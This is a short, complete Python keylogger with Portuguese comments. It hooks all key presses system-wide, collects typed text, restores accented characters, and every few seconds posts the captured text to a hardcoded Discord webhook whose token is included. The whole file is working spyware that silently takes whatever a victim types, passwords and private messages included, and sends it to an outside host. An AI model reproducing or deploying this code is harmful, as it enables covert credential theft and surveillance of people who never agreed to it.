import keyboard, requests, threading, unicodedata

WEBHOOK_URL = "https://discord.com/api/webhooks/1460011249776722035/YylQyHYQ9qVJyHd3jTyuHpNcR7O_Gc9CcpQOG18MHU3zfBpnIbFUo8-HAc3q070EYv96"

buffer = ""
timer = None

# Mapeamento de combinações para caracteres acentuados
acentos = {
    # minúsculas
    "'a": "á", "'e": "é", "'i": "í", "'o": "ó", "'u": "ú",
    "`a": "à", "`e": "è", "`i": "ì", "`o": "ò", "`u": "ù",
    "~a": "ã", "~o": "õ", "~n": "ñ",
    "^a": "â", "^e": "ê", "^i": "î", "^o": "ô", "^u": "û",
    ",c": "ç",

    # maiúsculas
    "'A": "Á", "'E": "É", "'I": "Í", "'O": "Ó", "'U": "Ú",
    "`A": "À", "`E": "È", "`I": "Ì", "`O": "Ò", "`U": "Ù",
    "~A": "Ã", "~O": "Õ", "~N": "Ñ",
    "^A": "Â", "^E": "Ê", "^I": "Î", "^O": "Ô", "^U": "Û",
    ",C": "Ç",
}

def send_to_discord(message):
    requests.post(WEBHOOK_URL, json={"content": message})

def normalizar_acentos(texto):
    for combo, acento in acentos.items():
        texto = texto.replace(combo, acento)
    return texto

def enviar_buffer():
    global buffer
    if buffer.strip():
        texto = unicodedata.normalize("NFC", buffer)
        texto = normalizar_acentos(texto)
        send_to_discord(f"🖊️ Texto digitado: {texto}")
        buffer = ""

def reset_timer():
    global timer
    if timer:
        timer.cancel()
    timer = threading.Timer(3.0, enviar_buffer)
    timer.start()

def on_key(event):
    global buffer
    if event.name == "backspace":
        buffer = buffer[:-1]
    elif event.name == "space":
        buffer += " "
    elif len(event.name) == 1:  # só caracteres simples
        buffer += event.name
    reset_timer()

keyboard.on_press(on_key)
keyboard.wait()